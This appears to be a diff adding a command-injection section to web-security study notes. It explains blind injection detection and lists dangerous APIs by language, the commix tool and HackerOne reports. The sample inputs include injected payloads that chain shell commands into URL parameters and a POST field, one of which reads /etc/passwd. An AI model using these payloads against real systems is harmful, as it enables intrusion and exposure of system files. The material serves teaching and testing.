@@ -158,3 +158,157 @@ https://medium.com/bugbountywriteup/sql-injection-time-and-boolean-based-27239b6
 [23] https://hackerone.com/reports/381771
 
 
+-------------------
+
+## 1. Command Injection
+
+
+
+Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell.
+
+#### Blind Command Injection
+
+Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required
+
+#### Detecting Blind Command Injection 
+
+You can use an injected command that will trigger a time delay, allowing you to confirm that the command was executed based on the time that the application takes to respond. The ping command is an effective way to do this, as it lets you specify the number of ICMP packets to send, and therefore the time taken for the command to run:
+
+& ping -c 10 127.0.0.1 &
+
+This command will cause the application to ping its loopback network adapter for 10 seconds.
+
+http://sensitive/cgi-bin/userData.pl?doc=user1.txt
+http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|
+http://sensitive/something.php?dir=%3Bcat%20/etc/passwd
+
+```
+POST http://www.example.com/public/doc HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20061010 FireFox/2.0
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+Referer: http://127.0.0.1/WebGoat/attack?Screen=20
+Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
+Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
+Content-Type: application/x-www-form-urlencoded
+Content-length: 33
+
+Doc=Doc1.pdf+|+Dir c:\
+```
+
+#### Code Review Dangerous API
+
+#####Java
+
+Runtime.exec()
+
+getParameter
+
+getRuntime.exec()
+
+ProcessBuilder.start()
+
+setAttribute putValue getValue
+
+java.net.Socket java.io.fileInputStream java.io.FileReader
+
+#####C/C++
+
+system
+
+exec
+
+ShellExecute
+
+execlp
+
+#####Python
+
+exec
+
+eval
+
+os.system
+
+os.popen
+
+subprocess.popen
+
+subprocess.call
+
+#####PHP
+
+system
+
+shell_exec
+
+exec
+
+proc_open
+
+eval
+
+passthru
+
+proc_open
+
+expect_open
+
+ssh2_exec
+
+popen
+
+#####Perl
+
+CGI.pm
+
+referer
+
+cookie
+
+ReadParse
+
+#####ASP.NET
+
+HttpRequest.Params
+HttpRequest.Url
+HttpRequest.Item
+
+Tool : https://github.com/commixproject/commix
+
+
+### Resources
+---
+
+**Reading**
+
+https://www.owasp.org/index.php/Command_Injection
+https://portswigger.net/web-security/os-command-injection
+https://www.checkmarx.com/knowledge/knowledgebase/OS-Command_Injection
+https://medium.com/bugbountywriteup/command-injection-poc-72cc3743f10d
+https://medium.com/hackernoon/nodejs-security-issue-javascript-node-example-tutorial-vulnerabilities-hack-line-url-command-injection-412011924d1b
+https://medium.com/@malcomvetter/the-legendary-command-injection-via-password-a57ace31d88
+
+**Reports**
+
+https://hackerone.com/reports/685447
+https://hackerone.com/reports/497312
+https://hackerone.com/reports/449482
+https://hackerone.com/reports/495382
+https://hackerone.com/reports/389561
+https://hackerone.com/reports/654888
+https://hackerone.com/reports/388936
+https://hackerone.com/reports/340208
+https://hackerone.com/reports/654888
+https://hackerone.com/reports/390848
+https://hackerone.com/reports/532667
+https://hackerone.com/reports/330957
+https://hackerone.com/reports/494979
+https://hackerone.com/reports/327512
+https://hackerone.com/reports/546753
+
